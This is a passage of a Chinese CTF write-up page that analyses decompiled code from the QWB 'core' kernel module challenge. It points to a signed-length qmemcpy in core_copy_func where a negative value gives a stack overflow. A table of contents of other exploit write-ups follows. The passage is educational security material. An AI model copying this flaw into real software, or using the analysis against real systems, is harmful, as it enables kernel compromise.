<h3 id="exit-core-函数"><a href="#exit-core-函数" class="headerlink" title="exit_core 函数"></a>exit_core 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">exit_core</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( core_proc )<br>    result = remove_proc_entry(<span class="hljs-string">&quot;core&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="core-ioctl函数"><a href="#core-ioctl函数" class="headerlink" title="core_ioctl函数"></a>core_ioctl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">core_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rbx</span><br><br>  v3 = a3;<br>  <span class="hljs-keyword">switch</span> ( a2 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889B</span>:<br>      core_read(a3);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD);<br>      off = v3;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_2B3);<br>      core_copy_func(v3);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="core-read函数"><a href="#core-read函数" class="headerlink" title="core_read函数"></a>core_read函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">core_read</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 *v2; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">signed</span> __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  __int64 v5; <span class="hljs-comment">// [rsp-50h] [rbp-50h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp-10h] [rbp-10h]</span><br><br>  v1 = a1;<br>  v6 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_25B);<br>  printk(&amp;unk_275);<br>  v2 = &amp;v5;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16LL</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v2 = <span class="hljs-number">0</span>;<br>    v2 = (__int64 *)((<span class="hljs-type">char</span> *)v2 + <span class="hljs-number">4</span>);<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)&amp;v5, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(v1, (<span class="hljs-type">char</span> *)&amp;v5 + off, <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    <span class="hljs-keyword">return</span> __readgsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>  __asm &#123; swapgs &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> __int64 __fastcall <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">signed</span> __int64 a1)</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 result; <span class="hljs-comment">// rax</span><br>  __int64 v2; <span class="hljs-comment">// [rsp-50h] [rbp-50h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp-10h] [rbp-10h]</span><br><br>  v3 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_215);<br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">63</span> )<br>  &#123;<br>    printk(&amp;unk_2A1);<br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0LL</span>;<br>    qmemcpy(&amp;v2, &amp;name, (<span class="hljs-type">unsigned</span> __int16)a1); <span class="hljs-comment">// vul</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>若在core_copy_func函数中传入的参数为负数，造成整型溢出，即可实现堆栈溢出。</p>
<p>​    </p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/11/08/security/ctf/wp/wp-tiesan-2020/">← Next tiesan 2020</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/11/06/security/ctf/wp/wp-nssc-2020/">NSSC 2020 CTF Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OTHER-WRITE-UP-FOR-ME"><span class="toc-text">OTHER WRITE UP FOR ME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#echoback"><span class="toc-text">echoback</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Flibc%E5%9F%BA%E5%9D%80"><span class="toc-text">泄漏libc基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Felf%E5%9F%BA%E5%9D%80"><span class="toc-text">泄漏elf基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%A0%86%E6%A0%88%E4%B8%ADmain-ret%E5%9C%B0%E5%9D%80"><span class="toc-text">泄漏堆栈中main ret地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-IO-FILE%E5%B0%86%E6%95%B0%E6%8D%AE%E6%89%93%E5%85%A5stack"><span class="toc-text">修改_IO_FILE将数据打入stack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-struct"><span class="toc-text">_IO_FILE struct</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-new-file-underflow"><span class="toc-text">_IO_new_file_underflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0rop%E9%93%BE"><span class="toc-text">构造rop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#greeting-150"><span class="toc-text">greeting-150</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%AE%BE%E7%BD%AE%E5%A4%A7%E7%9A%84%E5%80%BC%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">字符串漏洞设置大的值注意的地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#One-Gadget"><span class="toc-text">One Gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HackNote"><span class="toc-text">HackNote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-1"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-1"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96libc%E5%9F%BA%E5%9D%80"><span class="toc-text">获取libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell-1"><span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easyfmt"><span class="toc-text">Easyfmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-1"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-2"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SuperMaket"><span class="toc-text">SuperMaket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-text">漏洞代码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-text">整体思路:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97libc%E7%9A%84%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">获得libc的基地址:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8system"><span class="toc-text">调用system.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Babyheap"><span class="toc-text">Babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-2"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-1"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-2"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-1"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-3"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%A0%86%E5%BF%AB%E5%B8%83%E5%B1%80"><span class="toc-text">构造堆快布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8house-of-einherjar-%E6%9D%A5%E5%90%88%E5%B9%B6-chunk-1"><span class="toc-text">使用house of einherjar 来合并 chunk 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F-main-arena-%E5%92%8Clibc%E5%9F%BA%E5%9D%80"><span class="toc-text">泄漏 main_arena 和libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack%E6%89%93%E5%85%A5-malloc-hook%E5%A4%84"><span class="toc-text">fastbin attack打入 malloc_hook处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9malloc-hook"><span class="toc-text">修改malloc_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#realloc-hook%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="toc-text">realloc_hook反汇编</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execve%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5%E5%A6%82%E4%B8%8B"><span class="toc-text">execve执行情况如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0%E5%A6%82%E4%B8%8B"><span class="toc-text">payload构造如下</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-text">get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Grey"><span class="toc-text">House Of Grey</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-3"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-2"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-3"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-2"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-4"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E5%9D%80"><span class="toc-text">获取基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98%E5%AE%9A%E4%BD%8Dread-ret%E5%9C%B0%E5%9D%80"><span class="toc-text">搜索内存定位read ret地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0rop%E9%93%BE-1"><span class="toc-text">构造rop链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Orange"><span class="toc-text">House Of Orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-4"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-3"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-4"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-3"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-5"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-5"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-1"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9top-chunk-size%E5%AE%9E%E7%8E%B0free%E7%9A%84%E6%95%88%E6%9E%9C"><span class="toc-text">修改top chunk size实现free的效果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-libc-and-heap-addr"><span class="toc-text">Leak libc and heap addr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%BC%82%E5%B8%B8%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B"><span class="toc-text">触发异常劫持控制流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-%E4%BF%AE%E6%94%B9-IO-list-all"><span class="toc-text">unsorted bin attack 修改 _IO_list_all</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="toc-text">劫持流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9main-arena-fake-file%E4%B8%AD%E7%9A%84chain-%E6%8C%87%E5%90%91%E6%88%91%E4%BB%AC%E5%8D%B3%E5%B0%86%E4%BC%AA%E9%80%A0%E7%9A%84IO-FILE"><span class="toc-text">修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0IO-FILE"><span class="toc-text">伪造IO_FILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-vtable"><span class="toc-text">伪造 vtable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell-2"><span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-7"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UAF"><span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-5"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-4"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-5"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-4"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-6"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-6"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-6"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-2"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5chunk-2%E4%BF%AE%E6%94%B9size-%E5%92%8Cfd"><span class="toc-text">打入chunk 2修改size 和fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5-IO-2-1-stderr-157%E5%A4%84"><span class="toc-text">打入_IO_2_1_stderr + 157处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Flibc"><span class="toc-text">泄漏libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5-malloc-hook-0x23%E5%A4%84"><span class="toc-text">打入__malloc_hook - 0x23处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9malloc-hook-%E5%92%8Crealloc-hook%E6%89%93one-gadget"><span class="toc-text">修改malloc_hook 和realloc_hook打one_gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell-1"><span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-8"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyTHeap"><span class="toc-text">easyTHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-6"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-5"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-6"><span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-5"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-7"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%951"><span class="toc-text">打法1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-7"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-7"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-3"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-heap"><span class="toc-text">leak heap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-libc"><span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%85%A5"><span class="toc-text">实现任意地址写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9IO-2-1-stdout%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">修改IO_2_1_stdout结构体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp-1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%952"><span class="toc-text">打法2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-8"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp-2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%953"><span class="toc-text">打法3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-9"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp-3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AXB-2019-fmt"><span class="toc-text">AXB_2019_fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-7"><span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-6"><span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-6"><span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-8"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 